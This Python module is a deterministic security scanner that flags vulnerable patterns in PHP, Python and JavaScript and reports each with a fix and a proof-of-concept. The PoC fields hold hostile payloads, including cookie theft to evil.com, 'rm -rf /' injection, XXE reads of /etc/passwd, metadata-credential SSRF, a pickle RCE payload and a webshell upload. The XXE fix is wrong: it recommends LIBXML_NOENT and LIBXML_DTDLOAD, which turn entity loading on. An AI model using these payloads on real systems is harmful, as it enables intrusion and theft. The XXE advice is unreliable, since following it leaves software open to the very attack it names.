"""Deterministic security checks — extracted verbatim from app.py.

Contains:
  _strip_code_comments
  _fmt_issue
  verify_php_security
  verify_python_security
  verify_javascript_security
"""

import re


def _strip_code_comments(code: str, language: str) -> str:
    """Remove comments so regex checks do not fire on commented-out code."""
    lang = (language or "").lower()
    if lang in ("php", "javascript", "java", "c++", "csharp"):
        code = re.sub(r'/\*.*?\*/', ' ', code, flags=re.DOTALL)
        code = re.sub(r'//[^\n]*', ' ', code)
    if lang == "php":
        code = re.sub(r'#[^\n]*', ' ', code)
    elif lang == "python":
        code = re.sub(r'#[^\n]*', ' ', code)
        code = re.sub(r'""".*?"""', ' ', code, flags=re.DOTALL)
        code = re.sub(r"'''.*?'''", ' ', code, flags=re.DOTALL)
    return code


def _fmt_issue(i: int, issue: dict, lang: str = "php") -> str:
    """Format a deterministic finding into the standard markdown report block."""
    return (
        f"## [{issue['severity']}] Vulnerability #{i}: {issue['type']}\n\n"
        f"- **Location:** {issue.get('location', 'See snippet')}\n"
        f"- **Code Snippet:**\n```{lang}\n{issue['snippet']}\n```\n"
        f"- **CWE:** {issue.get('cwe', 'N/A')}\n"
        f"- **OWASP 2021:** {issue.get('owasp', 'N/A')}\n"
        f"- **Confidence:** High\n"
        f"- **Attack Vector:** {issue.get('attack_vector', 'Attacker-controlled input reaches a dangerous sink.')}\n"
        f"- **POC:** {issue.get('poc', 'See description.')}\n"
        f"- **Impact:** {issue['description']}\n"
        f"- **Fix:**\n```{lang}\n{issue['fix']}\n```\n\n"
    )


def verify_php_security(code: str, analysis_results: str) -> str:
    """Deterministic PHP security checks covering all major vulnerability classes.
    Always runs regardless of AI result — merges new findings with existing ones."""
    clean = _strip_code_comments(code, "php")
    lines = code.splitlines()
    issues = []
    seen_types: set = set()

    def _first_line(pattern: str, src: str = clean) -> tuple:
        """Return (snippet, location) for the first match of pattern in src."""
        m = re.search(pattern, src, re.IGNORECASE | re.DOTALL)
        if not m:
            return "", ""
        snippet = m.group(0)[:200].strip()
        # Find approximate line number in original code
        line_no = code[:m.start()].count('\n') + 1 if src is clean else "?"
        return snippet, f"Line ~{line_no}"

    def _add(issue: dict):
        if issue["type"] not in seen_types:
            seen_types.add(issue["type"])
            issues.append(issue)

    # ── 1. Insecure password hashing (MD5 / SHA1) ──────────────────────────
    pwd_pattern = r"""(?:md5|sha1)\s*\(\s*(?:\$_(?:POST|GET|REQUEST|COOKIE)\[|trim\s*\(\s*\$|\$(?!\w*html|\w*token|\w*key|\w*id)[a-zA-Z_]\w*\s*(?:\.|,|\)))"""
    snippet, loc = _first_line(pwd_pattern)
    if snippet:
        _add({
            "type": "Insecure Password Hashing",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-916 — Use of Password Hash With Insufficient Computational Effort",
            "owasp": "A02:2021 — Cryptographic Failures",
            "attack_vector": "Attacker dumps the DB and cracks MD5/SHA1 hashes offline in seconds.",
            "poc": "hashcat -a 0 -m 0 hashes.txt rockyou.txt",
            "description": "MD5 and SHA1 are cryptographically broken and trivially crackable. Never use them for passwords.",
            "fix": "password_hash($password, PASSWORD_BCRYPT);\n// verify: password_verify($input, $hash)",
        })

    # ── 2. XSS — per-line check (NOT file-wide) ───────────────────────────
    xss_output_pattern = re.compile(
        r'(?:echo|print|<\?=)\s*(?:["\'][^"\']*\$[^"\']*["\']|\$(?:_(?:GET|POST|REQUEST|COOKIE|SERVER|ENV)\b|\w+(?:\[.*?\])?)\s*(?:;|\.|\,|\)|\s*$))',
        re.IGNORECASE
    )
    dangerous_echo_lines = []
    for lineno, line in enumerate(lines, 1):
        clean_line = _strip_code_comments(line, "php").strip()
        if xss_output_pattern.search(clean_line) and not re.search(r'htmlspecialchars|htmlentities|strip_tags|intval|floatval|filter_var', clean_line, re.IGNORECASE):
            dangerous_echo_lines.append((lineno, line.strip()))
    if dangerous_echo_lines:
        sample = "\n".join(f"// Line {ln}: {ln_code}" for ln, ln_code in dangerous_echo_lines[:3])
        _add({
            "type": "Cross-Site Scripting (XSS) — Unescaped Output",
            "severity": "High",
            "location": f"Lines {', '.join(str(ln) for ln, _ in dangerous_echo_lines[:5])}",
            "snippet": sample,
            "cwe": "CWE-79 — Improper Neutralization of Input During Web Page Generation",
            "owasp": "A03:2021 — Injection",
            "attack_vector": "Attacker injects <script> via GET/POST parameter; victim browser executes it.",
            "poc": "?name=<script>fetch('https://evil.com/?c='+document.cookie)</script>",
            "description": "Variables are echoed directly to HTML without escaping, enabling stored or reflected XSS.",
            "fix": "echo htmlspecialchars($var, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');",
        })

    # ── 3. SQL injection — string concatenation into queries ──────────────
    sqli_pattern = r'(?:mysql[i]?_query|->query|->prepare\s*\(\s*"[^"]*\.\s*\$|PDO::query)\s*\(\s*["\'][^"\']*(?:\.\s*\$|\$[a-zA-Z_]\w*(?:\[.*?\])?)[^"\']*["\']'
    snippet, loc = _first_line(sqli_pattern)
    if not snippet:
        # Also catch direct variable interpolation in query strings
        sqli_pattern2 = r'(?:mysql[i]?_query|->query|->prepare)\s*\(\s*"[^"]*\$(?:_(?:GET|POST|REQUEST|COOKIE)|[a-zA-Z_]\w*)[^"]*"'
        snippet, loc = _first_line(sqli_pattern2)
    if snippet:
        _add({
            "type": "SQL Injection",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-89 — SQL Injection",
            "owasp": "A03:2021 — Injection",
            "attack_vector": "Attacker manipulates GET/POST parameter to alter query logic.",
            "poc": "?id=1 OR 1=1-- (dump all rows) | ?id=1; DROP TABLE users--",
            "description": "User input is concatenated directly into SQL queries allowing arbitrary query manipulation.",
            "fix": "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);",
        })

    # ── 4. Insecure file upload ────────────────────────────────────────────
    if re.search(r'\$_FILES', clean):
        has_move = re.search(r'move_uploaded_file', clean)
        ext_only = re.search(r'strtolower\s*\(\s*\$\w*ext\w*\s*\)|pathinfo.*PATHINFO_EXTENSION', clean, re.IGNORECASE)
        no_mime_check = not re.search(r'mime_content_type|finfo_file|getimagesize\s*\(', clean, re.IGNORECASE)
        web_path = re.search(r'["\'][^"\']*(?:uploads?|www|public_html|htdocs|webroot)[^"\']*["\']', clean, re.IGNORECASE)
        if has_move and (ext_only or no_mime_check) and web_path:
            snippet = web_path.group(0)[:150]
            _add({
                "type": "Insecure File Upload — Remote Code Execution",
                "severity": "Critical",
                "location": f"Line ~{code[:web_path.start()].count(chr(10)) + 1}",
                "snippet": snippet,
                "cwe": "CWE-434 — Unrestricted Upload of File with Dangerous Type",
                "owasp": "A04:2021 — Insecure Design",
                "attack_vector": "Attacker uploads a .php webshell; renames it to shell.php.jpg; server executes it.",
                "poc": "curl -F 'file=@shell.php;type=image/jpeg' https://victim/upload.php",
                "description": "Files uploaded to a web-accessible directory with insufficient content validation allow RCE.",
                "fix": (
                    "// 1. Store outside webroot: $dest = '/var/uploads/' . basename($filename);\n"
                    "// 2. Validate MIME: $finfo = new finfo(FILEINFO_MIME_TYPE);\n"
                    "//    if (!in_array($finfo->file($tmp), $allowed_types)) die('Invalid');\n"
                    "// 3. Block execution in upload dir via .htaccess: php_flag engine off"
                ),
            })

    # ── 5. PHP Object Injection (unserialize) ─────────────────────────────
    unser_pattern = r'unserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SESSION)|unserialize\s*\(\s*base64_decode\s*\(\s*\$'
    snippet, loc = _first_line(unser_pattern)
    if snippet:
        _add({
            "type": "PHP Object Injection via unserialize()",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-502 — Deserialization of Untrusted Data",
            "owasp": "A08:2021 — Software and Data Integrity Failures",
            "attack_vector": "Attacker crafts a serialized payload exploiting __wakeup or __destruct magic methods.",
            "poc": "O:8:'EvilClass':1:{s:4:'file';s:9:'/etc/passwd';}",
            "description": "Deserializing untrusted data allows Object Injection, potentially leading to RCE.",
            "fix": "Use json_decode()/json_encode() instead, or validate with a HMAC signature before deserializing.",
        })

    # ── 6. Variable injection (extract / parse_str) ───────────────────────
    varinject_pattern = r'extract\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)|parse_str\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)'
    snippet, loc = _first_line(varinject_pattern)
    if snippet:
        _add({
            "type": "Variable Injection via extract() / parse_str()",
            "severity": "High",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-473 — PHP External Variable Modification",
            "owasp": "A03:2021 — Injection",
            "attack_vector": "Attacker passes ?is_admin=1 to overwrite any variable in scope.",
            "poc": "GET /page.php?is_admin=1&price=0",
            "description": "extract() and parse_str() import all keys as PHP variables, allowing any variable to be overwritten.",
            "fix": "Remove extract()/parse_str(). Access $_POST['key'] explicitly with validation.",
        })

    # ── 7. Weak randomness for security tokens ────────────────────────────
    weakrand_pattern = r'(?:rand|mt_rand|array_rand|shuffle)\s*\(.*?\)\s*(?:;|\.)'
    if re.search(weakrand_pattern, clean):
        token_context = re.search(
            r'(?:token|nonce|salt|secret|otp|code|csrf|session|key|password|pwd|hash)\s*=\s*.*?(?:rand|mt_rand)',
            clean, re.IGNORECASE
        )
        if token_context:
            snippet = token_context.group(0)[:150].strip()
            _add({
                "type": "Insecure Randomness for Security Token",
                "severity": "High",
                "location": f"Line ~{code[:token_context.start()].count(chr(10)) + 1}",
                "snippet": snippet,
                "cwe": "CWE-338 — Use of Cryptographically Weak PRNG",
                "owasp": "A02:2021 — Cryptographic Failures",
                "attack_vector": "Attacker can predict token values due to seeded, non-cryptographic PRNG.",
                "poc": "// Brute-force token in O(2^32) — feasible offline in minutes",
                "description": "rand()/mt_rand() are not cryptographically secure and must not be used for security-sensitive tokens.",
                "fix": "$token = bin2hex(random_bytes(32)); // PHP 7+",
            })

    # ── 8. Open redirect ──────────────────────────────────────────────────
    redirect_pattern = r'header\s*\(\s*["\']Location:\s*["\'\s]*\.\s*\$|header\s*\(\s*"Location:\s*\$|header\s*\(.*?\$_(?:GET|POST|REQUEST)'
    snippet, loc = _first_line(redirect_pattern)
    if snippet:
        _add({
            "type": "Open Redirect",
            "severity": "Medium",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-601 — URL Redirection to Untrusted Site",
            "owasp": "A01:2021 — Broken Access Control",
            "attack_vector": "Attacker sends victim a trusted-looking URL that redirects to phishing site.",
            "poc": "https://victim.com/redirect.php?url=https://evil.com",
            "description": "Unvalidated user-controlled URL in header() Location redirect enables phishing attacks.",
            "fix": (
                "$allowed = ['https://trusted.com', 'https://app.local'];\n"
                "if (!in_array($url, $allowed)) die('Invalid redirect');\n"
                "header('Location: ' . $url);"
            ),
        })

    # ── 9. Path traversal ─────────────────────────────────────────────────
    lfi_pattern = r'(?:include|require|include_once|require_once|readfile|file_get_contents|fopen|file)\s*\(\s*(?:\$_(?:GET|POST|REQUEST|COOKIE)|[^)]*\.\s*\$_(?:GET|POST|REQUEST|COOKIE))'
    snippet, loc = _first_line(lfi_pattern)
    if snippet:
        _add({
            "type": "Path Traversal / Local File Inclusion",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-22 — Path Traversal",
            "owasp": "A01:2021 — Broken Access Control",
            "attack_vector": "GET ?file=../../../../etc/passwd or ?page=http://evil.com/shell.txt",
            "poc": "?file=../../../../../../etc/passwd%00",
            "description": "User-controlled path passed directly to file functions allows reading arbitrary files or RCE via RFI.",
            "fix": (
                "$allowed_pages = ['home', 'about', 'contact'];\n"
                "$page = basename($_GET['page']);\n"
                "if (!in_array($page, $allowed_pages)) die('Invalid');\n"
                "include 'pages/' . $page . '.php';"
            ),
        })

    # ── 10. SSRF via curl / file_get_contents with user URL ───────────────
    ssrf_pattern = r'(?:curl_setopt.*CURLOPT_URL.*\$_(?:GET|POST|REQUEST)|file_get_contents\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE))'
    snippet, loc = _first_line(ssrf_pattern)
    if snippet:
        _add({
            "type": "Server-Side Request Forgery (SSRF)",
            "severity": "High",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-918 — Server-Side Request Forgery",
            "owasp": "A10:2021 — Server-Side Request Forgery",
            "attack_vector": "Attacker makes server fetch http://169.254.169.254/latest/meta-data/ (cloud metadata).",
            "poc": "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "description": "User-controlled URL fetched server-side can reach internal services, cloud metadata, or localhost.",
            "fix": (
                "$parsed = parse_url($url);\n"
                "$allowed_hosts = ['api.trusted.com'];\n"
                "if (!in_array($parsed['host'], $allowed_hosts)) die('Blocked');"
            ),
        })

    # ── 11. XXE — XML parsers with external entities enabled ──────────────
    xxe_pattern = r'(?:simplexml_load_string|simplexml_load_file|DOMDocument\s*\(\)|new\s+SimpleXMLElement|XMLReader\s*::)\s*(?:\(|->)'
    if re.search(xxe_pattern, clean, re.IGNORECASE):
        no_protection = not re.search(r'LIBXML_NOENT|LIBXML_DTDLOAD|libxml_disable_entity_loader', clean, re.IGNORECASE)
        if no_protection:
            snippet, loc = _first_line(xxe_pattern)
            _add({
                "type": "XML External Entity Injection (XXE)",
                "severity": "High",
                "location": loc,
                "snippet": snippet,
                "cwe": "CWE-611 — Improper Restriction of XML External Entity Reference",
                "owasp": "A05:2021 — Security Misconfiguration",
                "attack_vector": "Attacker posts XML with <!ENTITY xxe SYSTEM 'file:///etc/passwd'> to read files.",
                "poc": "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><r>&xxe;</r>",
                "description": "XML parser loads external entities by default, enabling file read and SSRF.",
                "fix": (
                    "libxml_disable_entity_loader(true); // PHP < 8.0\n"
                    "// PHP 8+: external entity loading is disabled by default\n"
                    "$dom = new DOMDocument();\n"
                    "$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);"
                ),
            })

    # ── 12. Session fixation ──────────────────────────────────────────────
    sessfix_pattern = r'session_id\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)'
    snippet, loc = _first_line(sessfix_pattern)
    if snippet:
        _add({
            "type": "Session Fixation",
            "severity": "High",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-384 — Session Fixation",
            "owasp": "A07:2021 — Identification and Authentication Failures",
            "attack_vector": "Attacker sets ?PHPSESSID=attacker_known_id; victim logs in; attacker takes over session.",
            "poc": "https://victim.com/login?PHPSESSID=abc123 → victim logs in → attacker uses PHPSESSID=abc123",
            "description": "Accepting session ID from user input allows attacker to pre-set a known session ID.",
            "fix": "// After login, always regenerate the session ID:\nsession_regenerate_id(true);",
        })

    # ── 13. assert() with user input (RCE) ────────────────────────────────
    assert_pattern = r'assert\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)'
    snippet, loc = _first_line(assert_pattern)
    if snippet:
        _add({
            "type": "Remote Code Execution via assert()",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-94 — Code Injection",
            "owasp": "A03:2021 — Injection",
            "attack_vector": "assert() with a string argument evaluates it as PHP code.",
            "poc": "?expr=system('id')",
            "description": "assert() with a string argument is equivalent to eval() — direct RCE.",
            "fix": "// Remove assert() with user input entirely. Use explicit boolean checks.",
        })

    # ── 14. eval() / preg_replace /e modifier ────────────────────────────
    eval_pattern = r'eval\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE)|preg_replace\s*\(\s*["\'][^"\']*\/e[^"\']*["\']'
    snippet, loc = _first_line(eval_pattern)
    if snippet:
        _add({
            "type": "Remote Code Execution via eval()",
            "severity": "Critical",
            "location": loc,
            "snippet": snippet,
            "cwe": "CWE-94 — Code Injection",
            "owasp": "A03:2021 — Injection",
            "attack_vector": "eval() executes arbitrary PHP code supplied by the attacker.",
            "poc": "?code=system('whoami');",
            "description": "eval() with user-controlled input is direct Remote Code Execution.",
            "fix": "// Never pass user input to eval(). Refactor to use a safe dispatch table.",
        })

    if not issues:
        return None

    result = "## Security Issues Detected by Deterministic Analysis\n\n"
    result += f"> {len(issues)} issue(s) found by pattern-based checks (always reported regardless of AI verdict)\n\n"
    for i, issue in enumerate(issues, 1):
        result += _fmt_issue(i, issue, "php")
    return result


def verify_python_security(code: str) -> str:
    """Deterministic Python security checks. Returns formatted findings or None."""
    clean = _strip_code_comments(code, "python")
    issues = []
    seen_types: set = set()

    def _first(pattern: str) -> tuple:
        m = re.search(pattern, clean, re.IGNORECASE | re.DOTALL)
        if not m:
            return "", ""
        snippet = m.group(0)[:200].strip()
        loc = f"Line ~{code[:code.find(m.group(0))].count(chr(10)) + 1}" if m.group(0) in code else "See snippet"
        return snippet, loc

    def _add(issue: dict):
        if issue["type"] not in seen_types:
            seen_types.add(issue["type"])
            issues.append(issue)

    # eval / exec with user input
    snippet, loc = _first(r'(?:eval|exec)\s*\([^)]*(?:input\s*\(|request\.|flask\.request|argv|environ|sys\.stdin)')
    if snippet:
        _add({"type": "RCE via eval()/exec()", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-94 — Code Injection", "owasp": "A03:2021 — Injection",
              "attack_vector": "User input passed directly to eval/exec executes arbitrary Python code.",
              "poc": "input: __import__('os').system('id')",
              "description": "eval()/exec() with user-controlled input allows full Remote Code Execution.",
              "fix": "# Never eval() user input. Use ast.literal_eval() for safe literal parsing."})

    # pickle / marshal / shelve
    snippet, loc = _first(r'pickle\.loads?\s*\(|marshal\.loads?\s*\(|shelve\.open\s*\(')
    if snippet:
        _add({"type": "Unsafe Deserialization (pickle/marshal)", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-502 — Deserialization of Untrusted Data", "owasp": "A08:2021 — Integrity Failures",
              "attack_vector": "Attacker sends crafted pickle payload; Python executes __reduce__ during deserialization.",
              "poc": "import pickle,os; pickle.loads(b'cos\\nsystem\\n(S\\'id\\'\\ntR.')",
              "description": "Deserializing untrusted pickle/marshal data leads to RCE via __reduce__ gadgets.",
              "fix": "# Use json.loads() or a schema-validated format. Never pickle untrusted data."})

    # yaml.load without SafeLoader
    snippet, loc = _first(r'yaml\.load\s*\([^)]*\)(?!\s*,\s*Loader\s*=\s*yaml\.SafeLoader)')
    if snippet:
        _add({"type": "YAML Deserialization RCE", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-502 — Deserialization of Untrusted Data", "owasp": "A08:2021 — Integrity Failures",
              "attack_vector": "YAML document with !!python/object/apply: os.system ['id'] executes OS commands.",
              "poc": "!!python/object/apply:os.system ['whoami']",
              "description": "yaml.load() without Loader=yaml.SafeLoader executes arbitrary Python via special YAML tags.",
              "fix": "yaml.safe_load(data)  # or yaml.load(data, Loader=yaml.SafeLoader)"})

    # subprocess with shell=True and user input
    snippet, loc = _first(r'subprocess\.(?:call|run|Popen|check_output)\s*\([^)]*shell\s*=\s*True')
    if snippet:
        _add({"type": "OS Command Injection via subprocess(shell=True)", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-78 — OS Command Injection", "owasp": "A03:2021 — Injection",
              "attack_vector": "Shell metacharacters in user input execute arbitrary OS commands.",
              "poc": "filename = 'file.txt; rm -rf /'",
              "description": "shell=True passes the command to the OS shell — any unescaped user input enables command injection.",
              "fix": "subprocess.run(['cmd', arg1, arg2], shell=False)  # Pass args as list"})

    # SQL injection via string formatting
    snippet, loc = _first(r'(?:execute|executemany)\s*\(\s*["\'][^"\']*%s[^"\']*["\'\s]*%\s*\(|\bexecute\b.*\.format\s*\(|f["\'][^"\']*SELECT[^"\']*\{')
    if snippet:
        _add({"type": "SQL Injection via String Formatting", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-89 — SQL Injection", "owasp": "A03:2021 — Injection",
              "attack_vector": "Attacker injects SQL via string-formatted query parameter.",
              "poc": "' OR '1'='1",
              "description": "SQL query built with % or .format() instead of parameterised placeholders allows injection.",
              "fix": "cursor.execute('SELECT * FROM users WHERE id = ?', (user_id,))"})

    # Weak randomness for tokens
    snippet, loc = _first(r'random\.(?:random|randint|choice|randrange)\s*\(')
    if snippet:
        token_ctx = re.search(r'(?:token|secret|key|nonce|csrf|salt|otp|session|password)[^=\n]*=.*?random\.', clean, re.IGNORECASE)
        if token_ctx:
            snippet = token_ctx.group(0)[:150].strip()
            _add({"type": "Insecure Randomness for Security Token", "severity": "High", "location": loc, "snippet": snippet,
                  "cwe": "CWE-338 — Cryptographically Weak PRNG", "owasp": "A02:2021 — Cryptographic Failures",
                  "attack_vector": "Python's random module is seeded and predictable; tokens can be brute-forced.",
                  "poc": "# Predict next value by observing previous outputs",
                  "description": "random module is not cryptographically secure. Use secrets module for security tokens.",
                  "fix": "import secrets; token = secrets.token_urlsafe(32)"})

    # SSRF via requests with user input
    snippet, loc = _first(r'requests\.(?:get|post|put|delete|head|request)\s*\([^)]*(?:request\.|flask\.request|argv|input\s*\(|environ)')
    if snippet:
        _add({"type": "Server-Side Request Forgery (SSRF)", "severity": "High", "location": loc, "snippet": snippet,
              "cwe": "CWE-918 — SSRF", "owasp": "A10:2021 — SSRF",
              "attack_vector": "Attacker passes http://169.254.169.254/ to fetch cloud metadata or internal services.",
              "poc": "?url=http://169.254.169.254/latest/meta-data/",
              "description": "User-controlled URL passed to requests library enables SSRF to internal/cloud resources.",
              "fix": "# Validate URL against an allowlist before fetching\nif urlparse(url).hostname not in ALLOWED_HOSTS: raise ValueError"})

    # MD5/SHA1 for passwords
    snippet, loc = _first(r'hashlib\.(?:md5|sha1)\s*\([^)]*(?:password|passwd|pwd|secret)')
    if snippet:
        _add({"type": "Insecure Password Hashing (MD5/SHA1)", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-916 — Weak Password Hash", "owasp": "A02:2021 — Cryptographic Failures",
              "attack_vector": "Attacker dumps database and cracks MD5/SHA1 hashes offline in seconds.",
              "poc": "hashcat -a 0 -m 0 hashes.txt rockyou.txt",
              "description": "MD5/SHA1 are fast hashes, unsuitable for passwords. Crackable in seconds with GPU.",
              "fix": "import bcrypt; bcrypt.hashpw(password.encode(), bcrypt.gensalt())"})

    # tempfile.mktemp (TOCTOU)
    snippet, loc = _first(r'tempfile\.mktemp\s*\(')
    if snippet:
        _add({"type": "Race Condition (TOCTOU) via tempfile.mktemp()", "severity": "Medium", "location": loc, "snippet": snippet,
              "cwe": "CWE-377 — Insecure Temporary File", "owasp": "A04:2021 — Insecure Design",
              "attack_vector": "Attacker creates a symlink between mktemp() returning a name and the file being created.",
              "poc": "# Race: ln -s /etc/passwd /tmp/tmpXXXXXX between mktemp() and open()",
              "description": "mktemp() returns a name without creating the file — race condition between name generation and use.",
              "fix": "fd, path = tempfile.mkstemp()  # Atomically creates and opens the file"})

    if not issues:
        return None
    result = "## Security Issues Detected by Deterministic Python Analysis\n\n"
    result += f"> {len(issues)} issue(s) found by pattern-based checks\n\n"
    for i, issue in enumerate(issues, 1):
        result += _fmt_issue(i, issue, "python")
    return result


def verify_javascript_security(code: str) -> str:
    """Deterministic JavaScript / Node.js security checks. Returns formatted findings or None."""
    clean = _strip_code_comments(code, "javascript")
    issues = []
    seen_types: set = set()

    def _first(pattern: str) -> tuple:
        m = re.search(pattern, clean, re.IGNORECASE | re.DOTALL)
        if not m:
            return "", ""
        snippet = m.group(0)[:200].strip()
        loc = f"Line ~{code[:code.find(m.group(0))].count(chr(10)) + 1}" if m.group(0) in code else "See snippet"
        return snippet, loc

    def _add(issue: dict):
        if issue["type"] not in seen_types:
            seen_types.add(issue["type"])
            issues.append(issue)

    # eval / Function constructor
    snippet, loc = _first(r'\beval\s*\(|new\s+Function\s*\(')
    if snippet:
        _add({"type": "Code Injection via eval()/Function()", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-94 — Code Injection", "owasp": "A03:2021 — Injection",
              "attack_vector": "User-controlled string passed to eval() executes arbitrary JavaScript.",
              "poc": "eval(location.hash.slice(1))  →  #alert(document.cookie)",
              "description": "eval() and new Function() execute arbitrary JavaScript — XSS or RCE in Node.js.",
              "fix": "// Remove eval(). Use JSON.parse() for data, or a safe template renderer."})

    # innerHTML / outerHTML / insertAdjacentHTML
    xss_sink = re.finditer(r'(?:\.innerHTML|\.outerHTML|\.insertAdjacentHTML\s*\(|document\.write\s*\(|\.html\s*\()\s*[=\(]?\s*(?:[^;]*(?:location|search|hash|param|query|input|value|data|user|req\.))', clean, re.IGNORECASE)
    xss_matches = list(xss_sink)
    if xss_matches:
        snippet = xss_matches[0].group(0)[:200].strip()
        _add({"type": "DOM-based XSS via innerHTML/outerHTML", "severity": "High", "location": "See snippet", "snippet": snippet,
              "cwe": "CWE-79 — Cross-Site Scripting", "owasp": "A03:2021 — Injection",
              "attack_vector": "User-controlled data (URL params, form values) written to DOM sinks without sanitization.",
              "poc": "#<img src=x onerror=alert(document.cookie)>",
              "description": "Writing unsanitized user data to innerHTML/outerHTML allows DOM XSS attacks.",
              "fix": "element.textContent = userInput;  // Use textContent, not innerHTML\n// Or: DOMPurify.sanitize(userInput)"})

    # child_process with user input (Node.js)
    snippet, loc = _first(r'(?:exec|execSync|spawn|spawnSync)\s*\([^)]*(?:req\.|request\.|process\.argv|process\.env)')
    if snippet:
        _add({"type": "OS Command Injection (Node.js child_process)", "severity": "Critical", "location": loc, "snippet": snippet,
              "cwe": "CWE-78 — OS Command Injection", "owasp": "A03:2021 — Injection",
              "attack_vector": "User-controlled string injected into shell command via exec/spawn.",
              "poc": "?file=test.txt;rm -rf /",
              "description": "child_process.exec() with unsanitized user input allows arbitrary OS command execution.",
              "fix": "// Use spawn() with args array (no shell interpolation):\nspawn('cmd', [safeArg], { shell: false })"})

    # Math.random for security
    snippet, loc = _first(r'Math\.random\s*\(\s*\)')
    if snippet:
        token_ctx = re.search(r'(?:token|secret|key|nonce|csrf|salt|otp|session|password)[^=\n]*=.*?Math\.random', clean, re.IGNORECASE)
        if token_ctx:
            snippet = token_ctx.group(0)[:150].strip()
            _add({"type": "Insecure Randomness for Security Token", "severity": "High", "location": loc, "snippet": snippet,
                  "cwe": "CWE-338 — Weak PRNG", "owasp": "A02:2021 — Cryptographic Failures",
                  "attack_vector": "Math.random() is not cryptographically secure and can be predicted.",
                  "poc": "# Predict seed from observed values",
                  "description": "Math.random() must not be used for security tokens. Predictable in browser environments.",
                  "fix": "const token = crypto.randomBytes(32).toString('hex');  // Node.js\n// Browser: crypto.getRandomValues(new Uint8Array(32))"})

    # postMessage without origin check
    if re.search(r'addEventListener\s*\(\s*["\']message["\']', clean):
        no_origin_check = not re.search(r'event\.origin|message\.origin', clean)
        if no_origin_check:
            snippet, loc = _first(r'addEventListener\s*\(\s*["\']message["\']')
            _add({"type": "Missing postMessage Origin Validation", "severity": "Medium", "location": loc, "snippet": snippet,
                  "cwe": "CWE-346 — Origin Validation Error", "owasp": "A01:2021 — Broken Access Control",
                  "attack_vector": "Attacker's page sends postMessage to victim; handler executes without origin check.",
                  "poc": "// From attacker: targetWindow.postMessage('malicious', '*')",
                  "description": "message event handler does not validate event.origin, accepting messages from any window.",
                  "fix": "window.addEventListener('message', (e) => {\n  if (e.origin !== 'https://trusted.com') return;\n  // handle\n});"})

    # Open redirect (Node/Express)
    snippet, loc = _first(r'res\.redirect\s*\([^)]*(?:req\.(?:query|body|params)|request\.)')
    if snippet:
        _add({"type": "Open Redirect", "severity": "Medium", "location": loc, "snippet": snippet,
              "cwe": "CWE-601 — Open Redirect", "owasp": "A01:2021 — Broken Access Control",
              "attack_vector": "Attacker sends victim a URL that redirects to a phishing page.",
              "poc": "/redirect?url=https://evil.com",
              "description": "Unvalidated user-controlled URL in redirect enables phishing and credential theft.",
              "fix": "const ALLOWED = new Set(['/', '/dashboard', '/profile']);\nif (!ALLOWED.has(url)) url = '/';\nres.redirect(url);"})

    # Prototype pollution
    snippet, loc = _first(r'(?:merge|extend|assign|defaults)\s*\([^)]*(?:req\.|request\.|body\.|query\.)')
    if snippet:
        _add({"type": "Prototype Pollution via Object Merge", "severity": "High", "location": loc, "snippet": snippet,
              "cwe": "CWE-1321 — Prototype Pollution", "owasp": "A08:2021 — Integrity Failures",
              "attack_vector": '{"__proto__": {"isAdmin": true}} merged into app object pollutes Object.prototype.',
              "poc": 'POST body: {"__proto__": {"admin": true}}',
              "description": "Merging user-controlled objects without key sanitization can pollute Object.prototype.",
              "fix": "// Sanitize keys before merge:\nconst safe = JSON.parse(JSON.stringify(userObj));\n// Or use Object.create(null) as base"})

    if not issues:
        return None
    result = "## Security Issues Detected by Deterministic JavaScript Analysis\n\n"
    result += f"> {len(issues)} issue(s) found by pattern-based checks\n\n"
    for i, issue in enumerate(issues, 1):
        result += _fmt_issue(i, issue, "javascript")
    return result
